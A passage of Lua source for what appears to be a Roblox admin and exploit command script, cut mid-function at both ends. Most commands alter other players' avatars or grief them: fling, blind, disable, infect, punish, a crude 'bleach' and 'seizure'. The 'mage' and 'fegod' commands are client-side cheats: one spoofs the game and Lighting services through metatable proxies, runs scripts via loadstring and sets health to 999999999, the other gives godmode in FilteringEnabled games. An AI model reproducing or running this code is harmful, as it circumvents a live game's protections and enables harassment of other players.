			w2.C0 = CFrame.new(1.5, 0.5, 0.5) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(0), math.rad(0))
			local rip = false
			local connect1 = pchar["Left Arm"].Touched:connect(function(hit)
				if connect1 == false then
					connect1 = true
					if gPlayers:FindFirstChild(hit.Parent.Name) then
						infect(gPlayers[hit.Parent.Name])
					end
					wait(0.5)
					connect1 = true
				end
			end)
			local connect2 = pchar["Right Arm"].Touched:connect(function(hit)
				if connect2 == false then
					connect2 = true
					if gPlayers:FindFirstChild(hit.Parent.Name) then
						infect(gPlayers[hit.Parent.Name])
					end
					wait(0.5)
					connect2 = true
				end
			end)
			local IV = Instance.new("IntValue", pchar)
			IV.Name = "Infected"
			IV.Value = 0
			IV.Changed:connect(function()
				connect1:disconnect()
				connect2:disconnect()
			end)
		end
		infect(v)
	end
end)

addcmd('uninfect','makes player back to normal',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    refresh(gPlayers[v])
	end
end)

addcmd('duck','makes players head a duck',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    local pchar = gPlayers[v].Character
	    for i,v in pairs(pchar.Torso:GetChildren()) do
		    if v:IsA("Decal") then
			    v:Destroy()
		    end
	    end
	    for i,v in pairs(pchar:GetChildren()) do
		    if v:IsA("Accessory") then
			    v:Destroy()
		    end
	    end
	    local duck = Instance.new("SpecialMesh", pchar.Torso)
	    duck.MeshType = "FileMesh"
	    duck.MeshId = "http://www.roblox.com/asset/?id=9419831"
	    duck.TextureId = "http://www.roblox.com/asset/?id=9419827"
	    duck.Scale = Vector3.new(5, 5, 5)
	    pchar.Head.Transparency = 1
	    pchar["Left Arm"].Transparency = 1
	    pchar["Right Arm"].Transparency = 1
	    pchar["Left Leg"].Transparency = 1
	    pchar["Right Leg"].Transparency = 1
	    pchar.Head.face.Transparency = 1
	end
end)

addcmd('mage', 'mage',{},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker) else
if not LP.PlayerGui:FindFirstChild('ChangeArc') then
local arcPackage = game:GetService("InsertService"):LoadLocalAsset("rbxassetid://01337781430")
local fakeLighting = arcPackage.Lighting

local oldgame = game
local oldlighting = oldgame:GetService("Lighting")

local proLighting = newproxy(true)
local mtL = getmetatable(proLighting)
mtL.__index = function(self,ind)
	if fakeLighting:FindFirstChild(ind) then return fakeLighting[ind] end
	return oldlighting[ind]
end
mtL.__newindex = function(self,ind,val)
	oldlighting[ind] = val
end
mtL.__namecall = function(self,...)
	local args = {...}
	local method = table.remove(args)
	return oldlighting(method,unpack(args))
end

local proGame = newproxy(true)
local mt = getmetatable(proGame)
mt.__index = function(self,ind)
	if ind == "Lighting" then return proLighting end
	return oldgame[ind]
end
mt.__namecall = function(self,...)
	local args = {...}
	local method = table.remove(args)
	if method:lower() == "getservice" and args[1] == "Lighting" then return fakeLighting end
	return oldgame(method,unpack(args))
end

wait()
local destructAnchored = false
local maxMass = 1000

function newCESS(scr)
	local newFunc = loadstring(scr.Source)
	if type(newFunc) ~= "function" then return end
	setfenv(newFunc,setmetatable({script = scr},{
		__index = function(self,ind)
			if ind == "game" then return proGame end
			return getfenv()[ind]
		end,
		__newindex = function(self,ind,val)
			rawset(self,ind,val)
		end
	}))
	pcall(function()spawn(newFunc)end)
end

gPlayers.LocalPlayer.Character.Humanoid.MaxHealth = 999999999
gPlayers.LocalPlayer.Character.Humanoid.Health = 999999999

function destroyHook(obj,replacement,par)
	obj:GetPropertyChangedSignal("Parent"):Connect(function()
		local newObj = replacement:Clone()
		if newObj:IsA("ScreenGui") then newObj.ResetOnSpawn = false end
		newObj.Parent = par
		destroyHook(newObj,replacement,par)
	end)
end

for i,v in pairs(arcPackage.PlayerGui:GetChildren()) do
	local newObj = v:Clone()
	if newObj:IsA("ScreenGui") then newObj.ResetOnSpawn = false end
	newObj.Parent = gPlayers.LocalPlayer.PlayerGui
	destroyHook(newObj,v,gPlayers.LocalPlayer.PlayerGui)
end

function replaceScripts(root)
	for i,v in pairs(root:GetChildren()) do
		if v:IsA("Script") and not v:IsA("LocalScript") then
			local tempStore = {}
			for i2,v2 in pairs(v:GetChildren()) do
				table.insert(tempStore,v2:Clone())
			end
			local newScript = Instance.new("LocalScript",v.Parent)
			newScript.Name = v.Name
			for i2,v2 in pairs(tempStore) do
				v2.Parent = newScript
			end
			v:Destroy()
		end
		replaceScripts(v)
	end
end

local player = gPlayers.LocalPlayer

if not gPlayers.LocalPlayer:FindFirstChild("leaderstats1") then
	gPlayers.LocalPlayer.PlayerGui.leaderstats1.Parent = gPlayers.LocalPlayer
end

if not game.ReplicatedStorage:FindFirstChild("RankScript") then
	gPlayers.LocalPlayer.PlayerGui.RankScript.Parent = game.ReplicatedStorage
end

if not game.ReplicatedStorage:FindFirstChild(gPlayers.LocalPlayer.Name.."Element") then
	local eTemplate = gPlayers.LocalPlayer.PlayerGui.Player1Element
	eTemplate.Name = gPlayers.LocalPlayer.Name.."Element"
	eTemplate.Parent = game.ReplicatedStorage
end

if not game.ReplicatedStorage:FindFirstChild(gPlayers.LocalPlayer.Name.."FakeName") then
	local fTemplate = gPlayers.LocalPlayer.PlayerGui.Player1FakeName
	fTemplate.Name = gPlayers.LocalPlayer.Name.."FakeName"
	fTemplate.Parent = game.ReplicatedStorage
end

if not game.ReplicatedStorage:FindFirstChild(gPlayers.LocalPlayer.Name.."Level") then
	local lTemplate = gPlayers.LocalPlayer.PlayerGui.Player1Level
	lTemplate.Name = gPlayers.LocalPlayer.Name.."Level"
	lTemplate.Parent = game.ReplicatedStorage
end

if not game.ReplicatedStorage:FindFirstChild(gPlayers.LocalPlayer.Name.."Membership") then
	local mTemplate = gPlayers.LocalPlayer.PlayerGui.Player1Membership
	mTemplate.Name = gPlayers.LocalPlayer.Name.."Membership"
	mTemplate.Parent = game.ReplicatedStorage
end

function getMyPlayerArea()
	for i,v in pairs(game.Workspace.BuildingAreas:GetChildren()) do
		if v.Player.Value == player.Name then
			return v.PlayerArea
		end
	end
end

local whitelistedParts = {
	["DamagePart"] = true,
	["Explosion"] = true,
	["Explosion2"] = true,
	["SuperExplosion"] = true,
}

workspace.DescendantAdded:connect(function(desc)
	if desc:IsA("Script") and desc:IsDescendantOf(gPlayers.LocalPlayer.Character) then
		newCESS(desc)
	elseif whitelistedParts[desc.Parent.Name] and desc:IsA("Script") then
		newCESS(desc)
	elseif desc:IsA("BodyGyro") then
		desc:GetPropertyChangedSignal("MaxTorque"):Connect(function()
			desc.MaxTorque = Vector3.new(100000,100000,100000)
		end)
	--elseif desc:IsA("BodyPosition") then
	--	desc:GetPropertyChangedSignal("MaxForce"):Connect(function()
	--		desc.MaxForce = Vector3.new(10000,10000,10000)
	--	end)
	end
end)

player.Character.Humanoid.MaxHealth = (100+(player.leaderstats1.Level.Value*25))
player.Character.Humanoid.Health = player.Character.Humanoid.MaxHealth
player.PlayerGui.HealthGui.MaxMana.Value = (150+(player.leaderstats1.Level.Value*25))
player.PlayerGui.HealthGui.MaxXP.Value = (player.leaderstats1.Level.Value*50)
player.PlayerGui.HealthGui.Mana.Value = player.PlayerGui.HealthGui.MaxMana.Value

wait(1)

local player = gPlayers.LocalPlayer

local arcList = player.PlayerGui.ChangeArc.Stuff.ScrollingFrame
local arcTemplate = player.PlayerGui.ChangeArc.Stuff.ChangeTemplate

local arcToggler = player.PlayerGui.ChangeArc.ArcToggler.Toggle
local arcMoves = player.PlayerGui.ChangeArc.ArcMoves
local arcMovesList = arcMoves.ScrollingFrame
local moveTemplate = player.PlayerGui.ChangeArc.MoveTemplate

local arcs = {}

local currentArc = ""

function getMove(root)
	for i,v in pairs(root:GetChildren()) do
		if v.Name ~= "Requirement" then
			return v
		end
	end
	return nil
end

for i,v in pairs(fakeLighting.SkillFrames:GetChildren()) do
	table.insert(arcs,v)
end

for i,v in pairs(fakeLighting.Customs:GetChildren()) do
	table.insert(arcs,v)
end

for i,v in pairs(arcs) do
	local newTemplate = arcTemplate:Clone()
	newTemplate.ArcName.Text = v.Name
	newTemplate.Change.MouseButton1Down:connect(function()
		currentArc = v.Name
		arcToggler.Parent.Visible = true
		if fakeLighting.SkillFrames:FindFirstChild(currentArc) then
			arcMovesList:ClearAllChildren()
			arcToggler.Text = currentArc
			arcMoves.Title.Text = currentArc .. " Arc"
			for i5,v5 in pairs(fakeLighting.SkillFrames:FindFirstChild(currentArc).Stuff.ScrollingFrame:GetChildren()) do
				local myMove = getMove(v5.Learn)
				if myMove ~= nil then
					local newTemplate = moveTemplate:Clone()
					newTemplate.Attack.Text = v5.Name
					newTemplate.Position = UDim2.new(0,0,0,#arcMovesList:GetChildren()*47+5)
					newTemplate.Parent = arcMovesList
					arcMovesList.CanvasSize = UDim2.new(0,0,0,#arcMovesList:GetChildren()*47+5)
					newTemplate.Learn.MouseButton1Down:connect(function()
						local learnMove = myMove:Clone()
						learnMove.Parent = player.Backpack
						if learnMove:IsA("LocalScript") then
							learnMove.Disabled = false
							newTemplate.Learn.Text = "Activated"
							newCESS(learnMove)
						else
							newTemplate.Learn.Text = "Learned"
							newCESS(learnMove.LocalScript)
						end
						wait(5)
						newTemplate.Learn.Text = "Learn"
					end)
					newTemplate.Visible = true
				end
			end
		end
		if fakeLighting.Customs:FindFirstChild(currentArc) then
			arcMovesList:ClearAllChildren()
			arcToggler.Text = currentArc
			arcMoves.Title.Text = currentArc .. " Arc"
			for i,v in pairs(fakeLighting.Customs:FindFirstChild(currentArc).Stuff.ScrollingFrame:GetChildren()) do
				local myMove = getMove(v.Learn)
				if myMove ~= nil then
					local newTemplate = moveTemplate:Clone()
					newTemplate.Attack.Text = v.Name
					newTemplate.Position = UDim2.new(0,0,0,#arcMovesList:GetChildren()*47+5)
					newTemplate.Parent = arcMovesList
					arcMovesList.CanvasSize = UDim2.new(0,0,0,#arcMovesList:GetChildren()*47+5)
					newTemplate.Learn.MouseButton1Down:connect(function()
						local learnMove = myMove:Clone()
						learnMove.Parent = player.Backpack
						if learnMove:IsA("LocalScript") then
							learnMove.Disabled = false
							newTemplate.Learn.Text = "Activated"
							newCESS(learnMove)
						else
							newTemplate.Learn.Text = "Learned"
							newCESS(learnMove.LocalScript)
						end
						wait(5)
						newTemplate.Learn.Text = "Learn"
					end)
					newTemplate.Visible = true
				end
			end
		end
	end)
	newTemplate.Position = UDim2.new(0,0,0,#arcList:GetChildren()*47+5)
	newTemplate.Visible = true
	newTemplate.Parent = arcList
	arcList.CanvasSize = UDim2.new(0,0,0,#arcList:GetChildren()*47+5)
end

Open = false
MouseClick = function()
  if Open == false then
    Open = true
    player.PlayerGui.ChangeArc.Stuff.Visible = true
  else
    if Open == true then
      Open = false
      player.PlayerGui.ChangeArc.Stuff.Visible = false
    end
  end
end

player.PlayerGui.ChangeArc.Frame.Toggle.MouseButton1Down:connect(MouseClick)

Open2 = false
MouseClick2 = function()
  if Open2 == false then
    Open2 = true
    arcMoves.Visible = true
  else
    if Open2 == true then
      Open2 = false
      arcMoves.Visible = false
    end
  end
end

arcToggler.MouseButton1Down:connect(MouseClick2)

newCESS(player.PlayerGui.ArcMusicPlayer["Music Player Module"])

for i,v in pairs(player.PlayerGui.HealthGui:GetDescendants()) do
	if v:IsA("Script") then
		newCESS(v)
	end
end
end
end
end)

addcmd('unduck','makes player back to normal',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    refresh(gPlayers[v])
	end
end)

addcmd('mesh','makes a player into a mesh',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    local pchar = gPlayers[v].Character
	    for i,v in pairs(pchar.Torso:GetChildren()) do
		    if v:IsA("Decal") then
			    v:Destroy()
		    end
	    end
	    for i,v in pairs(pchar:GetChildren()) do
		    if v:IsA("Accessory") then
			    v:Destroy()
		    end
	    end
	    pchar.Head.Transparency = 1
	    pchar["Left Arm"].Transparency = 1
	    pchar["Right Arm"].Transparency = 1
	    pchar["Left Leg"].Transparency = 1
	    pchar["Right Leg"].Transparency = 1
	    pchar.Head.face.Transparency = 1
	    local msh = Instance.new("SpecialMesh", pchar.Torso)
	    msh.MeshType = "FileMesh"
		msh.Scale = Vector3.new(3, 3, 3)
	    msh.MeshId = "http://www.roblox.com/asset/?id=" ..args[2]
	    msh.TextureId = "http://www.roblox.com/asset/?id=" .. args[3]
	    msh.Scale = Vector3.new(3, 3, 3)
	end
end)

addcmd('disable','removes players humanoid',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		local pchar = gPlayers[v].Character
	    if pchar:FindFirstChild("Humanoid") then
		   pchar.Humanoid.Name = "HUMANOID_" .. gPlayers[v].Name
		   local humanoid = pchar["HUMANOID_" .. gPlayers[v].Name]
		   humanoid.Parent = game.ContextActionService
		if FindTable(SPC, args[1]) then Notify('Disabled ' .. args[1]) else
		Notify('Disabled player(s)') end
	    end end end)

addcmd('enable','gives player humanoid',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		local pchar = gPlayers[v].Character
	    if pchar:FindFirstChild("Humanoid") then
		    return
	    else
		    local humanoid = game.ContextActionService["HUMANOID_" .. gPlayers[v].Name]
		    humanoid.Parent = pchar
		    humanoid.Name = "Humanoid"
			if FindTable(SPC, args[1]) then Notify('Enabled ' .. args[1]) else
			Notify('Enabled player(s)') end
	    end end end)

addcmd('size','changes size of player',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	local pchar = gPlayers[v].Character
		local function scale(chr,scl)
			for _,v in pairs(pchar:GetChildren()) do
				if v:IsA("Accessory") then
					v:Clone()
					v.Parent = LightingService
				end end
		    local Head = chr['Head']
		    local Torso = chr['Torso']
		    local LA = chr['Left Arm']
		    local RA = chr['Right Arm']
		    local LL = chr['Left Leg']
		    local RL = chr['Right Leg']
		    local HRP = chr['HumanoidRootPart']
		    wait(0.1)
		    Head.formFactor = 3
		    Torso.formFactor = 3
		    LA.formFactor = 3
		    RA.formFactor = 3
		    LL.formFactor = 3
		    RL.formFactor = 3
		    HRP.formFactor = 3
		    Head.Size = Vector3.new(scl * 2, scl, scl)
		    Torso.Size = Vector3.new(scl * 2, scl * 2, scl)
		    LA.Size = Vector3.new(scl, scl * 2, scl)
		    RA.Size = Vector3.new(scl, scl * 2, scl)
		    LL.Size = Vector3.new(scl, scl * 2, scl)
		    RL.Size = Vector3.new(scl, scl * 2, scl)
		    HRP.Size = Vector3.new(scl * 2, scl * 2, scl)
		    local Motor1 = Instance.new('Motor6D', Torso)
		    Motor1.Part0 = Torso
		    Motor1.Part1 = Head
	    	Motor1.C0 = CFrame.new(0, 1 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
	    	Motor1.C1 = CFrame.new(0, -0.5 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
	    	Motor1.Name = "Neck"    
	    	local Motor2 = Instance.new('Motor6D', Torso)
	    	Motor2.Part0 = Torso
	    	Motor2.Part1 = LA
	    	Motor2.C0 = CFrame.new(-1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
	    	Motor2.C1 = CFrame.new(0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
	    	Motor2.Name = "Left Shoulder"
	    	local Motor3 = Instance.new('Motor6D', Torso)
	   		Motor3.Part0 = Torso
	    	Motor3.Part1 = RA
	    	Motor3.C0 = CFrame.new(1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
	    	Motor3.C1 = CFrame.new(-0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
	    	Motor3.Name = "Right Shoulder"
	    	local Motor4 = Instance.new('Motor6D', Torso)
	    	Motor4.Part0 = Torso
	    	Motor4.Part1 = LL
	    	Motor4.C0 = CFrame.new(-1 * scl, -1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
	    	Motor4.C1 = CFrame.new(-0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
	    	Motor4.Name = "Left Hip"
	    	local Motor5 = Instance.new('Motor6D', Torso)
	    	Motor5.Part0 = Torso
	    	Motor5.Part1 = RL
	    	Motor5.C0 = CFrame.new(1 * scl, -1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
	    	Motor5.C1 = CFrame.new(0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
	    	Motor5.Name = "Right Hip"
	    	local Motor6 = Instance.new('Motor6D', HRP)
	    	Motor6.Part0 = HRP
	    	Motor6.Part1 = Torso
	    	Motor6.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
	    	Motor6.C1 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1) end
		scale(pchar, args[2])
		for _,v in pairs(LightingService:GetChildren()) do
			if v:IsA("Accessory") then
				v.Parent = pchar
			end end end end)

addcmd('clone','clones player',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    local pchar = gPlayers[v].Character
		spawn(function()
	    	pchar.Archivable = true
	    	local clone = pchar:Clone()
	    	clone.Parent = workspace
			local cloneV = Instance.new("BoolValue")
			cloneV.Name = "isclone"
			cloneV.Parent = clone
	    	clone:MoveTo(pchar:GetModelCFrame().p)
	    	clone:MakeJoints()
	    	pchar.Archivable = false
		end)
	end
end)

addcmd('noclones', 'clears clones',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	for _, child in pairs( workspace:GetChildren()) do
    	if child.Name == gPlayers[v].Name and child:FindFirstChild('isclone') then
     	   child:Destroy()
  	  end
	end
end
end)

addcmd('spin','spins player',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
	    local pchar = gPlayers[v].Character
	    for i,v in pairs(pchar.Torso:GetChildren()) do
		    if v.Name == "Spinning" then
			    v:Destroy()
		    end
	    end
	    local Torso = pchar.Torso
	    local BG = Instance.new("BodyGyro", Torso)
	    BG.Name = "Spinning"
	    BG.maxTorque = Vector3.new(0, math.huge, 0)
	    BG.P = 11111
	    BG.cframe = Torso.CFrame
	    repeat wait(1/44)
		    BG.CFrame = BG.CFrame * CFrame.Angles(0,math.rad(30),0)
	    until not BG or BG.Parent ~= Torso
		end)
		end
end)

addcmd('unspin','stops spinning player',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    local pchar = gPlayers[v].Character
	    for i,v in pairs(pchar.Torso:GetChildren()) do
		    if v.Name == "Spinning" then
			    v:Destroy()
		    end
	    end
	end
end)

addcmd('dog','makes player a dog',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    local pchar = gPlayers[v].Character
	    if pchar:FindFirstChild("Shirt") then
		    pchar.Shirt:Destroy()
	    end
	    if pchar:FindFirstChild("Pants") then
		    pchar.Pants:Destroy()
	    end
	    if pchar:FindFirstChild("Shirt Graphic") then
		    pchar["Shirt Graphic"].Graphic = ""
	    end
	    pchar.Torso.Transparency = 1
	    pchar.Torso.Neck.C0 = CFrame.new(0,-.5,-2) * CFrame.Angles(math.rad(90),math.rad(180),0)
	    pchar.Torso["Right Shoulder"].C0 = CFrame.new(.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(90),0)
	    pchar.Torso["Left Shoulder"].C0 = CFrame.new(-.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(-90),0)
	    pchar.Torso["Right Hip"].C0 = CFrame.new(1.5,-1,1.5) * CFrame.Angles(0,math.rad(90),0)
	    pchar.Torso["Left Hip"].C0 = CFrame.new(-1.5,-1,1.5) * CFrame.Angles(0,math.rad(-90),0)
	    local FakeTorso = Instance.new("Seat", pchar)
	    FakeTorso.Name = "FakeTorso"
	    FakeTorso.FormFactor = "Symmetric"
	    FakeTorso.TopSurface = 0
	    FakeTorso.BottomSurface = 0
	    FakeTorso.Size = Vector3.new(3,1,4)
	    FakeTorso.BrickColor = BrickColor.new("Brown")
	    FakeTorso.CFrame = pchar.Torso.CFrame
	    local BF = Instance.new("BodyForce", FakeTorso)
	    BF.Force = Vector3.new(0, FakeTorso:GetMass() * 196.25, 0)
	    local W = Instance.new("Weld", pchar.Torso)
	    W.Part0 = pchar.Torso
	    W.Part1 = FakeTorso
	    W.C0 = CFrame.new(0,-.5,0)
	    local BC = pchar["Body Colors"]
	    BC.HeadColor = BrickColor.new("Brown")
	    BC.LeftArmColor = BrickColor.new("Brown")
	    BC.LeftLegColor = BrickColor.new("Brown")
	    BC.RightArmColor = BrickColor.new("Brown")
	    BC.RightLegColor = BrickColor.new("Brown")
	    BC.TorsoColor = BrickColor.new("Brown")
	end
end)

addcmd('undog','makes player back to normal',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    refresh(gPlayers[v])
	end
end)

addcmd('loopheal','loop heals player',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
	    local pchar = gPlayers[v].Character
	    if pchar:FindFirstChild("LoopHeal") then
		    pchar.LoopHeal.Name = "NotLoopHeal"
		    wait(0.1)
		    pchar.NotLoopHeal:Destroy()
	    end
	    local LoopHeal = Instance.new("StringValue", pchar)
	    LoopHeal.Name = "LoopHeal"
	    repeat wait(0.1)
		    pchar.Humanoid.Health = pchar.Humanoid.MaxHealth
	    until LoopHeal.Name == "NotLoopHeal"
		end)
		end
end)

addcmd('unloopheal','stops loop heal on player',{'noloopheal'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    local pchar = gPlayers[v].Character
	    if pchar:FindFirstChild("LoopHeal") then
		    pchar.LoopHeal.Name = "NotLoopHeal"
		    wait(0.1)
		    pchar.NotLoopHeal:Destroy()
	    end
	end
end)

addcmd('fling','flings player',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    local pchar = gPlayers[v].Character
		if pchar:FindFirstChild("Humanoid") then
			local xran
			local zran
			repeat
				xran = math.random(-9999,9999)
			until math.abs(xran) >= 5555
			repeat
				zran = math.random(-9999,9999)
			until math.abs(zran) >= 5555
			pchar.Humanoid.Sit = true
			pchar.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
			local BF = Instance.new("BodyForce", pchar.HumanoidRootPart)
			BF.force = Vector3.new(xran * 4, 9999 * 5, zran * 4)
		end
	end
end)

addcmd('skydive','self explanatory',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    local pchar = gPlayers[v].Character
		if pchar:FindFirstChild("HumanoidRootPart") then
		pchar.HumanoidRootPart.CFrame = pchar.HumanoidRootPart.CFrame + Vector3.new(0,10000,0)
		end
	end
end)

addcmd('bleach','drink bleach',{''},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	bleach(gPlayers[v])
	end
end)

addcmd('seizure','makes player have a seizure',{''},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    local pchar = gPlayers[v].Character
	    if pchar:FindFirstChild("Seizure") then
		    
	    end
	    local Seizure = Instance.new("StringValue", pchar)
	    Seizure.Name = "Seizure"
	    pchar.Humanoid.PlatformStand = true
		repeat wait()
		    pchar.Torso.Velocity = Vector3.new(math.random(-10,10),-5,math.random(-10,10))
		    pchar.Torso.RotVelocity = Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
		until Seizure.Name == "NotSeizure"
	end
end)

addcmd('fegod','gods you in fe games',{''},
function(args, speaker)
	if speaker.userId ~= LP.userId then
	lponly(speaker)
	else
		gPlayers.LocalPlayer.Character.Humanoid.Name = 1
		local l = gPlayers.LocalPlayer.Character["1"]:Clone()
		l.Parent = gPlayers.LocalPlayer.Character
		l.Name = "Humanoid"
		wait(0.1)
		gPlayers.LocalPlayer.Character["1"]:Destroy()
		workspace.CurrentCamera.CameraSubject = gPlayers.LocalPlayer.Character
		gPlayers.LocalPlayer.Character.Animate.Disabled = true
		wait(0.1)
		gPlayers.LocalPlayer.Character.Animate.Disabled = false
		gPlayers.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
	end
end)

addcmd('unseizure','makes player stop having a seizure',{''},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    local pchar = gPlayers[v].Character
	    if pchar:FindFirstChild("Seizure") then
	        pchar.Humanoid.PlatformStand = false
		    pchar.Seizure.Name = "NotSeizure"
		    wait(0.1)
		    pchar.NotSeizure:Destroy()
	    end
	end
end)

addcmd('m','makes a global message',{'message'},
function(args, speaker)
    local MSG = '['..speaker.Name..']: '..GLS(false, 0)
    local newMSG = '['..speaker.Name..']: '..GLS(false, 0)
    _G.msg(MSG)
end)

addcmd('sm','makes a global message',{'servermessage'},
function(args, speaker)
    local MSG = GLS(false, 0)
    local newMSG = GLS(false, 0)
    _G.msg(MSG)
end)

addcmd('fe','checks filtering status',{'filtering'},
function(args, speaker)
if workspace.FilteringEnabled == true then
	Notify('Filtering ENABLED') 
elseif workspace.FilteringEnabled == false then
	Notify('Filtering Disabled') 
end
end)

addcmd('paper','makes player thin as paper',{''},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    local pchar = gPlayers[v].Character
		for _, child in pairs( pchar:GetChildren()) do
    	if child.ClassName == "CharacterMesh" then
        child:Destroy()
   		end
		end
	    local LA = DATA.Paper:Clone()
	    LA.Parent = pchar["Left Arm"]
	    local RA = DATA.Paper:Clone()
	    RA.Parent = pchar["Right Arm"]
	    local LL = DATA.Paper:Clone()
	    LL.Parent = pchar["Left Leg"]
	    local RL = DATA.Paper:Clone()
	    RL.Parent = pchar["Right Leg"]
	    local T = DATA.Paper:Clone()
	    T.Parent = pchar.Torso
		local H = DATA.Paper:Clone()
		H.Parent = pchar.Head
		pchar.Head.face:Destroy()
	end
end)

addcmd('particles','gives a player particles',{''},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		local char = gPlayers[v].Character
		for i,v in pairs(char.HumanoidRootPart:GetChildren()) do
			if v:IsA('ParticleEmitter') then
				v:destroy()
			end
		end
		local prt = Instance.new('ParticleEmitter', char.HumanoidRootPart)
		prt.Texture = 'rbxassetid://' .. args[2]
		prt.Rate = 10
		prt.SpreadAngle = Vector2.new(50, 50)
	end
end)

addcmd('unparticles','gives a player particles',{'noparticles'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		local char = gPlayers[v].Character
		for i,v in pairs(char.HumanoidRootPart:GetChildren()) do
			if v:IsA('ParticleEmitter') then
				v:destroy()
			end
		end
	end
end)

blindT = {}
addcmd('blind','blinds a player',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
		if FindTable(blindT, _players[v].Name) then return end
		local blind = gPlayers[v].Name
local victim = gPlayers:FindFirstChild(blind)
if victim ~= nil then
victim.CameraMaxZoomDistance = 0.5
blnd = Instance.new("Part",workspace)
blnd.Name = "IYblind" .. gPlayers[v].Name
blnd.Size = Vector3.new(1,1,1)
blnd.CanCollide = false
blnd.BrickColor = BrickColor.new("Really black")
blnd.Material = "Neon"
local m = Instance.new("SpecialMesh",blnd)
m.Scale = Vector3.new(-1.5,-1.5,-1.5)
m.MeshId = "http://www.roblox.com/asset/?id=10061232"
local w = Instance.new("Weld",blnd)
w.Part0 = blnd
w.Part1 = victim.Character.Head
if FindTable(blindT, _players[v].Name) then return end
		table.insert(blindT, _players[v].Name)
		repeat if not workspace:FindFirstChild('IYblind' .. gPlayers[v].Name) then
local blind = gPlayers[v].Name
local victim = gPlayers:FindFirstChild(blind)
if victim ~= nil then
victim.CameraMaxZoomDistance = 0.5
blnd = Instance.new("Part",workspace)
blnd.Name = "IYblind" .. gPlayers[v].Name
blnd.Size = Vector3.new(1,1,1)
blnd.CanCollide = false
blnd.BrickColor = BrickColor.new("Really black")
blnd.Material = "Neon"
local m = Instance.new("SpecialMesh",blnd)
m.Scale = Vector3.new(-1.5,-1.5,-1.5)
m.MeshId = "http://www.roblox.com/asset/?id=10061232"
local w = Instance.new("Weld",blnd)
w.Part0 = blnd
w.Part1 = victim.Character.Head
end end wait(1)
until not FindTable(blindT, _players[v].Name)
end end) end end)

addcmd('unblind','blinds a player',{'noblind'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
		for a,b in pairs(blindT) do if b == _players[v].Name then table.remove(blindT, a) end end
		local blind = gPlayers[v].Name
local victim = gPlayers:FindFirstChild(blind)
if victim ~= nil then
victim.CameraMaxZoomDistance = 400 wait(0.5)
	for _, child in pairs( workspace:GetChildren()) do
    if child.Name == "IYblind" .. gPlayers[v].Name then
    child:Destroy()
end end end end) end end)

addcmd('punish','punishs player',{''},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    local pchar = gPlayers[v].Character
	    pchar.Parent = LightingService
	end
end)

addcmd('unpunish','unpunishs player',{''},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    if LightingService:FindFirstChild("" .. gPlayers[v].Name) then
	        LightingService:FindFirstChild("" .. gPlayers[v].Name).Parent = workspace
	    end
	end
end)

local starmanPlayers = {}
local starmanLastColor = nil
local starmanEvents = {}

addcmd("starman","Turns [plr] into starman",{},
function(args,speaker)
	local function starman(plr)
		local char = plr.Character
		local lastColor = ""
		local newColor = ""
	
		local powerupSound = Instance.new("Sound",char.HumanoidRootPart)
		powerupSound.Name = "PowerUp"
		powerupSound.Volume = 10
